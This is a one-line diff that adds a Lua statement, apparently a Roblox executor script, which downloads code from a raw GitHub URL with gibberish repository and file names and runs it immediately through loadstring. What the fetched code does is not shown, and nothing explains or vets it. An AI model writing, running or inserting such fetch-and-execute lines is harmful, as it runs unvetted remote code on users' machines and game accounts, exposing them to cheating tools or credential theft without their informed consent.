@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pogi1010/Com299jsjsnsjjsnwjq/main/Comksjajajajja"))()
